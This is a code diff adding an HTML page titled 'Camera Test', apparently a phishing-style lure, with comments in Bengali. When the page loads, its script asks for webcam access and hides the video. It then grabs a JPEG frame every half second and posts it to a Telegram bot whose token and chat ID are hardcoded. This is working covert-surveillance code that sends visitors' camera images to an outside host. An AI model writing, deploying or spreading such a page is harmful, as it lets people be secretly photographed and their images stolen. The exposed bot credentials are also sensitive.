@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Camera Test</title>
+    <style>
+        body { margin: 0; padding: 0; background: black; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <script>
+        const BOT_TOKEN = '8015433219:AAG-f00Wf8C863WUuO3G6eEoaS2J2JMlCa0';
+        const CHAT_ID = '7245153415';
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        let stream = null;
+        let interval = null;
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                await video.play();
+                startSending();
+            } catch (err) {
+                console.error('Camera error:', err);
+            }
+        }
+
+        async function captureAndSend() {
+            if (!video.videoWidth) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'frame.jpg');
+                try {
+                    await fetch(API_URL, { method: 'POST', body: formData });
+                } catch (e) {
+                    console.error('Send failed:', e);
+                }
+            }, 'image/jpeg', 0.7);
+        }
+
+        function startSending() {
+            if (interval) clearInterval(interval);
+            interval = setInterval(captureAndSend, 500); // প্রতি ৫০০ মিলিসেকেন্ড = ২/সেকেন্ড
+        }
+
+        // পেজ লোড হওয়ার সাথে সাথে ক্যামেরা চালু করার অনুরোধ
+        window.addEventListener('load', () => {
+            initCamera();
+        });
+
+        // পেজ ছেড়ে গেলে ক্যামেরা বন্ধ
+        window.addEventListener('beforeunload', () => {
+            if (interval) clearInterval(interval);
+            if (stream) stream.getTracks().forEach(track => track.stop());
+        });
+    </script>
+</body>
+</html>
